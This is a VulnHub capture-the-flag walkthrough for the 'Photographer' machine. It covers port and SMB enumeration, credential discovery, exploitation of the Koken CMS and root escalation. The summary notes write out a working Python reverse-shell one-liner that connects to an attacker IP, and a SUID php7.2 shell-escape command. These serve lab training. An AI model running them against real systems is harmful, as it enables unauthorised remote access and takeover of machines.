---
title: Photographer
categories: [VulnHub]
tags: [CMS, PrivEsc, RFI, SUIDs, SMB, koken_CMS, php]
image:
  path: https://www.infosecarticles.com/content/images/2020/09/port80-1.png
  alt: Photographer Machine 📷
---

## **Description ⤵️**


##### 💡 [Photographer : 1](https://vulnhub.com/entry/photographer-1,519/) ⤵️

***This machine was developed to prepare for OSCP. It is boot2root, tested on VirtualBox (but works on VMWare) and has two flags: user.txt and proof.txt.***


### **Let’s find the IP Address first >>**

```bash
IP : 10.0.2.25
```
{: .nolineno}
{: .nolineno}

## Port Scan Results ➡️

![124-1.png](/Vulnhub-Files/img/Photographer/124-1.png)

![124-2.png](/Vulnhub-Files/img/Photographer/124-2.png)

```bash
OPEN PORTS >
80   HTTP
139  SMB
445  SMB
8000 HTTP
```
{: .nolineno}
{: .nolineno}

---

## Web Enumeration ⤵️

![125-1.png](/Vulnhub-Files/img/Photographer/125-1.png)

Lets first do some directory traversal through `feroxbuster` Tool →

![127-1.png](/Vulnhub-Files/img/Photographer/127-1.png)

Then I checked port 8000, I found this `koken CMS` page.

![125-2.png](/Vulnhub-Files/img/Photographer/125-2.png)

I searched through public exploit from searchsploit Tool and found this exploit related to `koken CMS`. 

![125-3.png](/Vulnhub-Files/img/Photographer/125-3.png)

Lets check the SMB part as well →

![128-1.png](/Vulnhub-Files/img/Photographer/128-1.png)

![128-2.png](/Vulnhub-Files/img/Photographer/128-2.png)

![128-3.png](/Vulnhub-Files/img/Photographer/128-3.png)

```bash
Lets try these credentials → 
→ agi@photographer.com
→ daisa@photographer.com
→ my babygirl
So the final credentials were → 
ID     : daisa@photographer.com
pass : babygirl
```
{: .nolineno}
{: .nolineno}

I guess I got in successfully !

![128-4.png](/Vulnhub-Files/img/Photographer/128-4.png)

Now after login to koken site Lets do some further reconnaissance from internet →

![125-4.png](/Vulnhub-Files/img/Photographer/125-4.png)

Let is follow the exploit path →

![125-5.png](/Vulnhub-Files/img/Photographer/125-5.png)

![125-6.png](/Vulnhub-Files/img/Photographer/125-6.png)

Got the results my RFI is working fine →

![125-7.png](/Vulnhub-Files/img/Photographer/125-7.png)

Then I executed the python reverse shell code and I got this →

![126-1.png](/Vulnhub-Files/img/Photographer/126-1.png)

![126-2.png](/Vulnhub-Files/img/Photographer/126-2.png)

```bash
user.txt → d41d8cd98f00b204e9800998ecf8427e
```
{: .nolineno}
{: .nolineno}

while cheching the SUID file I got this →

![126-3.png](/Vulnhub-Files/img/Photographer/126-3.png)

![126-4.png](/Vulnhub-Files/img/Photographer/126-4.png)

![126-5.png](/Vulnhub-Files/img/Photographer/126-5.png)

![126-6.png](/Vulnhub-Files/img/Photographer/126-6.png)

```bash
proof.txt → d41d8cd98f00b204e9800998ecf8427e
```
{: .nolineno}
{: .nolineno}

<hr>
<br>

# **Summery Notes →**

> 💡
>Koken 0.22.24
>
>daisa@photographer.com
>
>agi@photographer.com
>
> ```bash
> python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
> ```
> 
> `./usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"`
{: .prompt-tip }

<hr>

> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }